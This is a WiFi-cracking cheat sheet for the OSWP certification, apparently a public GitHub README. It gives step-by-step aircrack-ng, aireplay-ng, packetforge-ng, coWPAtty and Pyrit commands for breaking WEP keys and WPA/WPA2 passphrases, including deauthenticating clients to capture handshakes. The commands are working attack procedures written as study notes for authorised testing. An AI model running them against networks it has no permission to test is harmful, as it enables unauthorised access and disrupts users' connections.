# OSWP-CheatSheet
```
# Update 27 Jully 2021

This repository was previously private for my personal study. Since Offensive Security retired this Course Certification, i decided to make this repository public. As the repo mention only tools usage, it shouldn't be a problem.

- V0lk3n
```
This repository contain a CheatSheet for OSWP &amp; WiFi Cracking.

NOTE : Most of these attacks was tested on a Back Track 5 OS, if you are using a Kali Linux up to date or other distro, some commands can have minor changes.

# TODO
- Add others attack technic such as Krack Attack, WPS Crack, Dragon Blood (WPA3) and more...

# Table of Contents

* 0.0 [Recon](#Recon)
* 1.0 [Cracking WEP](#WEP)
  * 1.1 [With connected Clients](#WEP-ConnectedClients)
  * 1.2 [Via a Client](#WEP-Client)
  * 1.3 [Clientless](#WEP-Clientless)
  * 1.4 [Bypassing Shared Key Authentication](#WEP-Bypass-SKA)
* 2.0 [Cracking WPA/WPA2 PSK](#WPA)
  * 2.1 [Cracking WPA](#WPA-Crack)
  * 2.1 [Aicrack-ng and John The Ripper's](#WPA-Aicrack-JTR)
  * 2.2 [coWPAtty](#WPA-coWPAtty)
  * 2.3 [Pyrit](#WPA-Pyrit)
* 3.0 [Troubleshooting](#Troubleshooting)

# Recon<a name="Recon"></a>

To determine if we are using ieee80211 or mac80211 drivers use this command:

If it said "nl80211 not found." that mean we are using ieee80211 drivers. Else we are using mac80211 and the "iw list" output will print wireless card informations.
```
root@wifu:~# iw list
nl80211 not found.
```

To display access point names and their corresponding channel number with mac80211 drivers use the following syntax:

```
root@wifu:~# iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID"
  SSID: wifu  
  DS Parameter set: channel 3  
  SSID: 6F36E6  
  DS Parameter set: channel 1
```

To display access point names and their corresponding channel number with ieee80211 drivers use the following syntax:

```
root@wifu:~# iwlist wlan0 scanning | egrep "ESSID|Channel"
                     ESSID:"wifu"
                     Channel:3
                     ESSID:"6F36E6"
                     Channel:11
```

To display your wireless card MAC address, use the following syntax:

```
root@wifu:~# macchanger -s mon0
Current MAC: <MAC address> <(Device information)>
```

# Cracking Wep<a name="WEP"></a>

## WEP - With connected Clients<a name="WEP-ConnectedClients"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```
 
Start and Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
 
```
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```
 
Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```
 
Deauthenticate the connected client to force new IV generation by the AP:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
 
Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:

```
aircrack-ng <capture>
```
 
## WEP - Via a Client<a name="WEP-Client"></a>

Place your wireless card into monitor mode on the AP channel:

```
airmon-ng start <interface> <AP channel>
```

Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Next, conduct a fake authentication against the access point:

```
aireplay-ng -0 1 -e <ESSID> -a <AP MAC> -w <capture> <interface>
```

Launch the interactive packet replay attack looking for ARP packets coming from the AP:

```
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
```

Once enough IVs have been captured, crack the WEP key:

```
aircrack-ng -z <capture>
```

## WEP - Clientless<a name="WEP-Clientless"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):

### KoreK Chop Chop Attack
```
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
````

### Fragmentation Attack
```
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
```

Craft an ARP request packet using packetforge-ng:

```
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
```

Inject the packet into the network using attack 2, the interactive packet replay attack:

```
aireplay-ng -2 -r <packet filename> <interface>
```

Crack the WEP key using Aircrack-ng:

```
aircrack-ng <capture>
```

## WEP - Bypassing Shared Key Authentication<a name="WEP-Bypass-SKA"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate the connected client to capture the PRGA XOR keystream:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Conduct a fake shared key authentication using the XOR keystream:

```
aireplay-ng -1 0 -e <ESSID> -y <keystreamfile> -a <AP MAC> -h <Your MAC> <interface>
```

Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the victim client again to force the generation of an ARP packet:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once IVs are being generated by the AP, run Aircrack-ng against the capture:

```
aircrack-ng <capture>
```

# Cracking WPA/WPA2 PSK<a name="WPA"></a>

## WPA - Crack<a name="WPA-Crack"></a>

Begin by placing your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Crack the WPA password with Aircrack-ng :

```
aircrack-ng -w <wordlist> <capture>
```

Alternatively, if you have an Airolib-ng database, it can be passed to Aircrack:

```
aircrack-ng -r <db name> <capture>
```

## Aircrack-ng and John The Ripper<a name="WPA-Aicrack-JTR"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Force a client to reconnect and complete the 4-way handshake by running a deauthentication attack against it:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once a handshake has been captured, change to the John the Ripper directory and pipe in the mangled words into Aircrack-ng to obtain the WPA password:

```
./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
```

## coWPAtty<a name="WPA-coWPAtty"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the file to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

To crack the WPA password with coWPAtty in wordlist mode:

```
cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
```

To use rainbow table mode with coWPAtty, first generate the hashes:

```
genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
```

Run coWPAtty with the generated hashes to recover the WPA password:

```
cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
```

## Pyrit<a name="WPA-Pyrit"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Use Pyrit to sniff on the monitor mode interface, saving the capture to a file:

```
pyrit -r <interface> -o <capture> stripLive
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Run Pyrit in dictionary mode to crack the WPA password:

```
pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
```

To use Pyrit in database mode, begin by importing your wordlist:

```
pyrit -i <wordlist> import_passwords
```

Add the ESSID of the access point to the Pyrit database:

```
pyrit -e <ESSID> create_essid
```

Generate the PMKs for the ESSID:

```
pyrit -r <capture> -b <AP MAC> attack_db
```

# Troubleshooting<a name="Troubleshooting"></a>

During a Sharing Key Authentication Bypass attack, if once you deauthenticate a client you got a "Broken SKA" message instead of the "140 bytes keystream : <MAC address>" into your Airodump output. Try to restart the Airodump-ng capture and deauthenticate another client.
 
